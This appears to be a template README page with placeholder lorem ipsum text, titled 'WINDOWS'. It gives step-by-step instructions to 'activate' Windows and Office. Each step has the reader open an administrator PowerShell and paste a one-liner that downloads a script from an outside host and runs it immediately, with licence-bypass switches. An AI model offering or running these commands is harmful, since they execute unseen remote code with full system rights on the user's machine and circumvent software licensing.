<table align="center"><tr></tr><tr><td>
  <img src=".assets/icon.svg" align="center" width="98">
</td></tr></table>

<h1 align="center">WINDOWS</h1>

<table>
  <tbody><tr><td align="center" width="99999"><div>
    <a href="https://windows.com">WEBSITE</a>
  </div></td></tr></tbody>
  <tbody><tr><td align="center" width="99999">&nbsp;<div>
    Lorem ipsum dolor sit amet, consectetur adipiscing elit. Ut semper turpis ipsum, at vulputate lacus congue pulvinar. In et convallis nunc, eget tempor orci. Nullam et viverra eros. In scelerisque aenean.
  </div>&nbsp;</td></tr></tbody>
</table>

## LEARNING

### ACTIVATE WINDOWS

- Press <kbd>Win</kbd> + <kbd>X</kbd> to reveal menu.
- Click <kbd>Run PowerShell as Administrator</kbd> to pop an elevated shell.
- Copy and paste the following command to activate:
  ```powershell
  & ([ScriptBlock]::Create((Invoke-RestMethod "https://get.activated.win"))) /HWID /S
  ```

### ACTIVATE OFFICE

- Press <kbd>Win</kbd> + <kbd>X</kbd> to reveal menu.
- Click <kbd>Run PowerShell as Administrator</kbd> to pop an elevated shell.
- Copy and paste the following command to activate:
  ```powershell
  & ([ScriptBlock]::Create((Invoke-RestMethod "https://get.activated.win"))) /OHOOK /S
  ```
